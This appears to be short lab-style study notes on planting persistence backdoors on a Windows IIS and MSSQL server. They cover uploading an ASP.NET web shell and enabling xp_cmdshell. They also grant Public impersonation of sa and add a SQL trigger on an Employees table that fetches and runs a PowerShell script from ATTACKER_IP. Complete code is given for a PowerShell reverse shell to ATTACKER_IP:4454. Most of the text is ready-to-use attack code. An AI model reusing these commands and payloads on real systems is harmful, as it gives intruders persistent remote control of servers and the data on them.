#cybersecurity #windows 

Planting backdoor in a typical web server setup.

### Using Web Shells
Uploading a web shell to the web directory
We can use the privileges of the configured user in IIS
`iis apppool\defaultapppool`: it has the special `SeImpersonatePrivilege`

Let's download ASP.NET web shell 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx

Transfer it to the victim into 
`C:\inetupub\wwwroot`

`http://MACHINE_IP/shell.aspx`

### Using MSSQL as a backdoor
We use **triggers** to INSERT into `HRDB` database

We need to configure some things before
First we need to enable `xp_cmdshell`, it's a default stored procedure that allows to run commands directly in the system console

In `Microsoft SQL Server Management Studio`

```SQL
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

We can grant privileges to all users to impersonate `sa`, the default database administrator

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

After this we can configure the trigger

```sql
USE HRDB

CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Now we can create the evil script

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

We run a python web server to handle the download of the file and a nc listener to reverse connect to the target machine

